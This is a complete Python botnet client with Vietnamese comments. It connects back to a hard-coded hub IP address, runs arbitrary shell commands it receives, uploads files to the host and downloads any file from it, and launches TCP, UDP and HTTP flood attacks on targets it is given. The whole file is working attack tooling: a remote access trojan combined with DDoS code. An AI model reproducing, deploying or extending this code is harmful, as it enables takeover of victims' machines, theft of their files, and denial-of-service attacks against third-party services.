#!/usr/bin/env python3
import socket
import time
import json
import struct
import base64
import os
import platform
import subprocess
import threading
import random
import requests
from datetime import datetime
from pathlib import Path

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Dummy:
        RESET_ALL = ''
        RED = ''
        GREEN = ''
        YELLOW = ''
        CYAN = ''
        MAGENTA = ''
    Fore = Style = Dummy()

# Cấu hình thông qua biến môi trường
HUB_HOST = os.getenv("HUB_HOST", "147.185.221.31")   # Thay bằng hub host thực tế của bạn
HUB_PORT = int(os.getenv("HUB_PORT", "17852"))        # Cổng của Hub
AUTH_TOKEN = os.getenv("HUB_TOKEN", "CHANGE_ME")      # Token phải giống trên hub, controller và worker

WORKER_NAME = os.getenv("WORKER_NAME", platform.node())
RECONNECT_DELAY = 5
HEARTBEAT_INTERVAL = 15
CHUNK_SIZE = 64 * 1024

# ------------------------ Hàm Giao Tiếp Cơ Bản ------------------------
def send_msg(sock, obj):
    data = json.dumps(obj).encode("utf-8")
    sock.sendall(struct.pack("!I", len(data)) + data)

def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("disconnected")
        buf += chunk
    return buf

def recv_msg(sock):
    header = recv_exact(sock, 4)
    (length,) = struct.unpack("!I", header)
    payload = recv_exact(sock, length)
    return json.loads(payload.decode("utf-8"))

# ------------------------ Hàm Tấn Công ------------------------
def send_tcp_attack(server_ip, server_port, packet, packet_count, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((server_ip, server_port))
        for i in range(packet_count):
            if stop_event.is_set():
                break
            try:
                s.sendall(packet)
            except Exception:
                break
        s.close()
    except Exception as e:
        print(Fore.RED + f"[TCP] Lỗi khi tấn công: {e}" + Style.RESET_ALL)

def send_http_attack(url, stop_event, method="GET", request_count=100):
    count = 0
    while not stop_event.is_set() and count < request_count:
        try:
            headers = {"User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (X11; Linux x86_64)",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                "curl/8.0.1",
                "Wget/1.21.4",
                "PostmanRuntime/7.32.2"
            ])}
            if method.upper() == "POST":
                r = requests.post(url, timeout=5, headers=headers)
            else:
                r = requests.get(url, timeout=5, headers=headers)
            count += 1
        except Exception:
            count += 1

def send_udp_attack(server_ip, server_port, packet, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Với UDP kích thước gói tin tối đa có thể là 65507, ta sử dụng kích thước gói tin nhỏ hơn cho an toàn
        while not stop_event.is_set():
            try:
                s.sendto(packet, (server_ip, server_port))
            except Exception:
                break
        s.close()
    except Exception as e:
        print(Fore.RED + f"[UDP] Lỗi khi tấn công: {e}" + Style.RESET_ALL)

def handle_attack(target, mode, duration, thread_count):
    print(Fore.CYAN + f"[attack] Bắt đầu tấn công {mode.upper()} vào {target} trong {duration} giây với {thread_count} luồng" + Style.RESET_ALL)
    stop_event = threading.Event()
    try:
        attack_duration = int(duration)
    except ValueError:
        attack_duration = 60
    timer = threading.Timer(attack_duration, stop_event.set)
    timer.start()
    threads = []
    if mode.lower() == "tcp":
        try:
            host, port = target.split(":")
            server_ip = socket.gethostbyname(host)
            server_port = int(port)
        except Exception as e:
            print(Fore.RED + f"[attack] Lỗi khi phân tích target TCP: {e}" + Style.RESET_ALL)
            return
        # Gói tin kích thước 1MB
        packet = b"\x00" * (1024 * 1024)
        packet_count = 100
        for i in range(int(thread_count)):
            t = threading.Thread(target=send_tcp_attack, args=(server_ip, server_port, packet, packet_count, stop_event))
            t.start()
            threads.append(t)
    elif mode.lower() == "http":
        url = target if target.startswith("http") else "http://" + target
        request_count = 100
        for i in range(int(thread_count)):
            t = threading.Thread(target=send_http_attack, args=(url, stop_event, "GET", request_count))
            t.start()
            threads.append(t)
    elif mode.lower() == "udp":
        try:
            host, port = target.split(":")
            server_ip = socket.gethostbyname(host)
            server_port = int(port)
        except Exception as e:
            print(Fore.RED + f"[attack] Lỗi khi phân tích target UDP: {e}" + Style.RESET_ALL)
            return
        # Với UDP, chọn kích thước gói tin 1024 bytes
        packet = b"\x00" * 1024
        for i in range(int(thread_count)):
            t = threading.Thread(target=send_udp_attack, args=(server_ip, server_port, packet, stop_event))
            t.start()
            threads.append(t)
    else:
        print(Fore.RED + "[attack] Chế độ tấn công không hợp lệ." + Style.RESET_ALL)
        return
    for t in threads:
        t.join()
    print(Fore.GREEN + f"[attack] Tấn công vào {target} hoàn thành." + Style.RESET_ALL)

# ------------------------ Hàm Xử Lý Worker ------------------------
def run_cmd(cmd, cwd=None):
    try:
        completed = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=cwd)
        return True, completed.returncode, completed.stdout, completed.stderr
    except Exception as e:
        return False, -1, "", str(e)

def connect_and_run():
    cwd = str(Path.home())
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HUB_HOST, HUB_PORT))
            send_msg(sock, {
                "type": "hello",
                "role": "worker",
                "token": AUTH_TOKEN,
                "meta": {
                    "name": WORKER_NAME,
                    "platform": f"{platform.system()} {platform.release()}",
                    "cwd": cwd
                }
            })
            ack = recv_msg(sock)
            if ack.get("type") != "hello_ack":
                sock.close()
                time.sleep(RECONNECT_DELAY)
                continue

            last_hb = time.time()
            while True:
                if time.time() - last_hb > HEARTBEAT_INTERVAL:
                    send_msg(sock, {"type": "heartbeat"})
                    last_hb = time.time()

                sock.settimeout(1.0)
                try:
                    msg = recv_msg(sock)
                except socket.timeout:
                    continue

                mtype = msg.get("type")
                if mtype == "sysinfo":
                    data = {
                        "name": WORKER_NAME,
                        "platform": f"{platform.system()} {platform.release()}",
                        "python": platform.python_version(),
                        "cwd": cwd,
                        "env_count": len(os.environ),
                    }
                    send_msg(sock, {"type": "sysinfo", "data": data})
                elif mtype == "cd":
                    path = msg.get("path", "")
                    try:
                        os.chdir(path)
                        cwd = os.getcwd()
                        send_msg(sock, {"type": "exec_result", "ok": True, "rc": 0, "stdout": f"[cwd] {cwd}", "stderr": ""})
                    except Exception as e:
                        send_msg(sock, {"type": "exec_result", "ok": False, "rc": -1, "stdout": "", "stderr": str(e)})
                elif mtype == "exec":
                    ok, rc, out, err = run_cmd(msg.get("cmd", ""), cwd=cwd)
                    send_msg(sock, {"type": "exec_result", "ok": ok, "rc": rc, "stdout": out, "stderr": err})
                elif mtype == "file_begin":
                    pass
                elif mtype == "file_chunk":
                    session_id = msg.get("session_id")
                    remote_path = msg.get("remote_path")
                    data_b64 = msg.get("data_b64")
                    data = base64.b64decode(data_b64)
                    mode = msg.get("mode", "ab")
                    with open(remote_path, "ab" if mode == "ab" else "wb") as f:
                        f.write(data)
                elif mtype == "file_done":
                    send_msg(sock, {"type": "file_done", "session_id": msg.get("session_id")})
                elif mtype == "download":
                    session_id = msg.get("session_id")
                    remote_path = msg.get("remote_path")
                    with open(remote_path, "rb") as f:
                        while True:
                            chunk = f.read(CHUNK_SIZE)
                            if not chunk:
                                break
                            send_msg(sock, {
                                "type": "file_chunk",
                                "direction": "download",
                                "session_id": session_id,
                                "remote_path": remote_path,
                                "data_b64": base64.b64encode(chunk).decode("ascii")
                            })
                    send_msg(sock, {"type": "file_done", "session_id": session_id})
                elif mtype == "attack":
                    target = msg.get("target", "")
                    mode_param = msg.get("mode", "tcp")
                    duration = msg.get("duration", "60")
                    thread_count = msg.get("threads", "1")
                    threading.Thread(target=handle_attack, args=(target, mode_param, duration, thread_count), daemon=True).start()
                elif mtype == "exit":
                    sock.close()
                    return
                else:
                    pass
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    connect_and_run()
